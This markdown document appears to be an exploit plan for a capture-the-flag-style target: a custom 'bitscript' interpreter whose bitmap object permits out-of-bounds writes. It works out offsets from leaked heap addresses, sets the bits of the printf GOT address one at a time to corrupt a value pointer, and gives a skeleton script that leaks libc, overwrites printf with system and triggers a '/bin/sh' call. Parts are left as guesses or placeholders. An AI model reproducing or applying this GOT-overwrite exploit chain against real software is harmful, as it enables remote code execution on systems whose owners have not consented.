# RCE Exploit - Calculated Approach

## Known Values

**From your leaks:**
- `addr1 = 160550944` (0x9920C20)
- `addr2 = 160551248` (0x9920D50)
- `addr3 = 160551552` (0x9920E40)

**Targets:**
- `printf@GOT = 0x409048` (from exploit_addresses.txt)
- Need: `system` address (calculate from libc)

## Calculation Strategy

### Step 1: Estimate Variable Entry Address

**From `targetaddr` (leaked string address):**
- Variable entry typically 0x100-0x1000 bytes before string
- Let's try: `entry_addr = targetaddr - 0x200`
- `value_ptr_offset = entry_addr + 0x28`

### Step 2: Estimate Bitmap Buffer Address

**Bitmap allocated after variables:**
- `bitmap_data_ptr â‰ˆ targetaddr + 0x1000`
- Or use OOB read to find it

### Step 3: Calculate y Value

**Formula:**
```
target = entry_addr + 0x28
y = ((target - bitmap_data_ptr) * 8) / INT64_MAX
x = ((target - bitmap_data_ptr) * 8) % 8
```

**With INT64_MAX = 0x7FFFFFFFFFFFFFFF:**
- For small offsets, `y` will be very small (0 or 1)
- `x` will be the bit offset within the byte

### Step 4: Write 0x409048 Bit-by-Bit

**0x409048 in binary (little-endian, 64-bit):**
```
Byte 0: 0x48 = 0b01001000
Byte 1: 0x90 = 0b10010000
Byte 2: 0x40 = 0b01000000
Bytes 3-7: 0x00
```

**Set bits:**
- Bit 3, 6 (byte 0)
- Bit 0, 3, 4 (byte 1)
- Bit 6 (byte 2)

### Step 5: Read and Calculate

```bitscript
int libc_leak = target;  // Reads from printf@GOT
// Calculate system address
// Write system to GOT
```

## Practical Implementation

**The challenge is finding exact addresses. We have two options:**

### Option A: Brute Force Scan

Use OOB read to scan heap backwards from leaked addresses:
```bitscript
bitmap b1 = create(9223372036854775807, 2);
// Scan from targetaddr - 0x1000 to targetaddr
// Look for "target" string at offset 0x00
// When found, that's the variable entry
```

### Option B: Use Known Offsets

If heap layout is predictable:
- Variable entries are typically 0x200-0x400 bytes before strings
- Try common offsets: 0x100, 0x200, 0x300, 0x400

## Complete Exploit Script Structure

```bitscript
// 1. Leak addresses
int target = 0;
string target = "target";
int targetaddr = target;

// 2. Create bitmap
bitmap b1 = create(9223372036854775807, 2);

// 3. Find entry address (OOB read or calculate)

// 4. Calculate y value
// y = ((entry_addr + 0x28 - bitmap_data_ptr) * 8) / INT64_MAX

// 5. Write 0x409048 bit-by-bit
set(b1, x + 3, y, 1);   // Bit 3
set(b1, x + 6, y, 1);   // Bit 6
// ... (all set bits)

// 6. Read libc address
int libc = target;
print(libc);

// 7. Calculate system (need libc offsets)

// 8. Write system to GOT (similar to step 5)

// 9. Trigger
print("/bin/sh");
```

## Next Steps

1. **Create OOB read script** to find exact variable entry addresses
2. **Test address calculations** with known values
3. **Write bit-by-bit write helper** (manual calculation)
4. **Test libc leak** once value_ptr is corrupted
5. **Complete RCE** with system write

The leaked addresses give us the foundation - now we need to build the exploit on top!

